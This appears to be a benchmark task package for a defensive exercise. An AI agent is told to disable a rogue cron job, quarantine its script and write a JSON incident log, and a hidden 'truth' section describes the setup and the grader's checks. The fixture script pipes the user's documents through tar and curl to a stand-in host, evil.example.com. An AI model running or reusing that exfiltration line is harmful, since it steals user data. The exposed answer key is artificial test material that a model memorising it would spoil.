description:
You are an incident responder who has been asked to neutralise a suspicious cron-based persistence mechanism that was discovered in the user’s home directory.

INITIAL SITUATION
1. A cron-style job definition exists in  
   /home/user/cron.d/evil_job  
   Its single line is:  
   * * * * * /home/user/cron.d/evil.sh

2. The script referenced by that job is stored at  
   /home/user/cron.d/evil.sh

3. No quarantine directory or incident log currently exists.

YOUR OBJECTIVES
A. Disable the rogue cron entry.  
   • Do NOT delete the file.  
   • Instead, comment-out the single job line by prefixing it with the “#” character.  
   • The result must be exactly:  
     # * * * * * /home/user/cron.d/evil.sh  
     (keep the leading “#”, a single space, then the five asterisks, etc.)

B. Quarantine the script.  
   • Create the directory /home/user/quarantine (if it does not yet exist).  
   • Move /home/user/cron.d/evil.sh into that directory, preserving its filename (evil.sh).

C. Produce an incident log in JSON format so that auditors can verify what you did.  
   • Path: /home/user/incident_logs/rogue-cron-remediation.json  
   • Create the parent directory /home/user/incident_logs if necessary.  
   • The file must contain a single JSON array with one object whose keys appear in the order shown below.  
     Required keys and example value placeholders:

     [
       {
         "timestamp": "2024-05-08T14:35:12Z",
         "original_path": "/home/user/cron.d/evil.sh",
         "quarantine_path": "/home/user/quarantine/evil.sh",
         "sha256": "4c1f2e4c…",                ← 64-hex-char checksum of the file *before* you move it
         "action": "quarantined"
       }
     ]

   • timestamp must be in ISO-8601 UTC (YYYY-MM-DDTHH:MM:SSZ).  
   • sha256 must be exactly the 64-character lowercase hexadecimal digest of the file’s contents before it is moved.  
   • action must be the literal string quarantined.  
   • Apart from normal JSON whitespace (indentation/new-lines), no extra keys or data should appear.

WHAT THE AUTOMATED TEST WILL CHECK
1. /home/user/cron.d/evil_job exists and its only non-blank line is precisely the commented version shown above.  
2. /home/user/quarantine/evil.sh exists and is byte-for-byte identical to the original malicious script.  
3. /home/user/incident_logs/rogue-cron-remediation.json exists, is valid JSON, contains exactly one array element, and all fields meet the formatting rules (timestamp format, correct SHA-256 for the quarantined file, correct literal strings).

Use any standard Linux command-line tools you wish—typical responders solve this with roughly 2–3 commands.
truth:
Initial directory layout and contents before the agent starts:

/home/user/cron.d/            (0700)
/home/user/cron.d/evil_job     (0600)
 Contents (exact, 1 trailing newline):
* * * * * /home/user/cron.d/evil.sh\n

/home/user/cron.d/evil.sh      (0700)
 Contents (exact, 1 trailing newline):
#!/bin/bash
echo "stealing data..."
tar czf - /home/user/documents | curl -X POST -T - http://evil.example.com/upload\n

No /home/user/quarantine or /home/user/incident_logs directories exist.

During verification the test harness will:
• Read /home/user/cron.d/evil.sh *before* any agent action and calculate its SHA-256 hash (call this EXPECTED_HASH).  
• Confirm that the JSON file’s "sha256" value equals EXPECTED_HASH.  
• Confirm that /home/user/quarantine/evil.sh is byte-identical to the original script (same hash).

No other files or directories are relevant to the test.
